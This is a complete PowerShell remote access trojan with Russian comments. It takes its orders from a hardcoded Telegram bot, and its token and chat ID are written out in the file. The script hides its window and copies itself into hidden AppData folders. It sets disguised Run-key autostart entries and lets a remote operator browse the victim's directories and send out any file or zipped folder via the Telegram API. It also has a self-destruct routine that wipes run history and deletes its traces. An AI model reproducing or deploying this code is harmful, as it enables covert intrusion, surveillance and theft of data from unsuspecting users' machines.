# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Установка в автозагрузку с защитой от очистки TEMP
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "WindowsSystem_" + (Get-Random -Minimum 1000 -Maximum 9999) + ".exe"
$scriptPath = "$env:APPDATA\Microsoft\Windows\$scriptName"

# Создаем скрытую папку в AppData
$hiddenDir = "$env:APPDATA\Microsoft\Windows\SystemCache"
if (!(Test-Path $hiddenDir)) { 
    New-Item -ItemType Directory -Path $hiddenDir -Force | Out-Null
    attrib +s +h "$hiddenDir" 2>&1 | Out-Null
}

$scriptPath = "$hiddenDir\$scriptName"

if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8

# Дублируем в другое место для надежности
$backupPath = "$env:LOCALAPPDATA\Microsoft\Windows\Security\$scriptName"
$scriptContent | Out-File -FilePath $backupPath -Encoding UTF8
Set-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$backupPath`"" -Force

Set-ItemProperty -Path $regPath -Name "WindowsSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size - $($item.LastWriteTime.ToString('dd.MM.yyyy HH:mm'))"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            $success = $true
                            $report = "Отчет самоуничтожения:"
                            
                            # Очистка истории RUN
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
                                $report += "`n✓ История RUN очищена"
                            } catch {
                                $success = $false
                                $report += "`n✗ Ошибка очистки истории RUN"
                            }
                            
                            # Удаление из автозагрузки
                            try {
                                Remove-ItemProperty -Path $regPath -Name "WindowsSystem" -Force -ErrorAction Stop
                                Remove-ItemProperty -Path $regPath -Name "WindowsSecurityUpdate" -Force -ErrorAction Stop
                                $report += "`n✓ Записи автозагрузки удалены"
                            } catch {
                                $success = $false
                                $report += "`n✗ Ошибка удаления автозагрузки"
                            }
                            
                            # Удаление файлов
                            try {
                                if (Test-Path $scriptPath) { 
                                    Remove-Item $scriptPath -Force -ErrorAction Stop
                                    $report += "`n✓ Основной файл удален"
                                }
                                if (Test-Path $backupPath) { 
                                    Remove-Item $backupPath -Force -ErrorAction Stop
                                    $report += "`n✓ Резервный файл удален"
                                }
                                if (Test-Path $hiddenDir) { 
                                    Remove-Item $hiddenDir -Recurse -Force -ErrorAction Stop
                                    $report += "`n✓ Скрытая папка удалена"
                                }
                            } catch {
                                $success = $false
                                $report += "`n✗ Ошибка удаления файлов"
                            }
                            
                            # Удаление текущего скрипта через планировщик
                            try {
                                $currentScript = $MyInvocation.MyCommand.Path
                                $taskName = "Cleanup_" + (Get-Random -Minimum 1000 -Maximum 9999)
                                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c timeout 3 && del `"$currentScript`" /f /q"
                                $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
                                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Force -ErrorAction Stop
                                $report += "`n✓ Задача удаления текущего файла создана"
                            } catch {
                                $report += "`n⚠ Не удалось создать задачу удаления текущего файла"
                            }
                            
                            if ($success) {
                                $report += "`n`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
                            } else {
                                $report += "`n`n⚠ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
                            }
                            
                            Send-Telegram $report
                            exit
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
